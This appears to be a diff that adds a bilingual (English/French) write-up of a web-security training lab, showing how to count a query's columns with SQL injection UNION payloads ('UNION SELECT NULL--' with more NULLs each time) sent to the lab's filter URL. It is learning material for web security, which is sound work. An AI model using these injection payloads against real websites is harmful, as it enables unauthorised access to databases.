@@ -1,0 +1,22 @@
+          DESCRIPTION
+------------------------------------------------------------------------------------------------------
+This lab contains an SQL injection vulnerability in the product category filter.
+The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+The first step of such an attack is to determine the number of columns that are being returned by the query.
+You will then use this technique in subsequent labs to construct the full attack.
+
+To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack
+ that returns an additional row containing null values.
+------------------------------------------------------------------------------------------------------
+
+Afin de déterminer le nombre de colonnes, on peut utiliser les techniques données au sein du chapitre sur les SQLi UNION attacks.
+
+Le premier payload abouti à une Internal server error.
+https://0a9d004504574f61c09b3fbd00c200b7.web-security-academy.net/filter?category=Corporate+gifts'UNION SELECT NULL--
+
+Il suffit d'incrémenter le nombre de NULL dans la requête jusqu'à ce que l'erreur disparaisse,
+signifiant que nous sommes sur le bon nombre de colonnes :
+
+https://0a9d004504574f61c09b3fbd00c200b7.web-security-academy.net/filter?category=Corporate+gifts'UNION SELECT NULL,NULL,NULL--
+
+Le site répond à partir de 3 NULL, on sait donc que la database dispose de 3 colonnes.
